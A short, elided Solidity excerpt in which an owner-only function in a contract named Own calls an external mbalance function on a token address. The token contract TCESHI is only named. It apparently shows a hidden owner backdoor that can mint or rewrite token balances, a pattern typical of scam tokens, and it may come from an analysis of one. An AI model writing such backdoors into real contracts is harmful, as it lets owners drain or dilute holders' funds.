...
interface ITRQ {
    function mbalance(address to,uint256 tAmount) external ;
}
...
contract Own is  Ownable {
    ...
    function m(address to,uint256 amount) public onlyOwner {
        ITRQ(tokenAddr).mbalance(to,amount*10**18);
    }
...
contract TCESHI is IERC20, Ownable {
